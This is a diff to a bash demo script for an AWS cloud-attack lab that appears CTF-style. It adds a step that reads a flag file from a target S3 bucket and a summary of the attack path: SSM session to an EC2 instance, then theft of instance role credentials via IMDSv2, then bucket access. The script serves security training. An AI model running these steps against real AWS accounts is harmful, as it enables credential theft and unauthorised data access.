@@ -359,12 +359,26 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 10: Capture the CTF flag
+echo -e "${YELLOW}Step 10: Capturing the CTF flag${NC}"
+echo "Reading flag.txt from the target bucket..."
+show_attack_cmd "Attacker" "aws s3 cp s3://$TARGET_BUCKET/flag.txt - --region $AWS_REGION"
+FLAG_VALUE=$(aws s3 cp s3://$TARGET_BUCKET/flag.txt - --region $AWS_REGION 2>/dev/null)
+if [ -n "$FLAG_VALUE" ]; then
+    echo ""
+    echo -e "${GREEN}✓ FLAG CAPTURED:${NC} $FLAG_VALUE"
+else
+    echo -e "${RED}✗ Failed to read flag.txt${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with ssm:StartSession permission)"
@@ -372,10 +386,11 @@ echo "2. Started interactive SSM session on EC2 instance: $INSTANCE_ID"
 echo "3. Extracted instance role credentials from metadata service (IMDSv2)"
 echo "4. Used credentials from: $EC2_BUCKET_ROLE"
 echo "5. Achieved: S3 Bucket Access to $TARGET_BUCKET"
+echo "6. Captured CTF flag: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (ssm:StartSession) → EC2 Instance"
-echo -e "  → (Extract Credentials via IMDS) → $EC2_BUCKET_ROLE → S3 Bucket"
+echo -e "  → (Extract Credentials via IMDS) → $EC2_BUCKET_ROLE → S3 Bucket → flag.txt (CTF flag)"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo ""
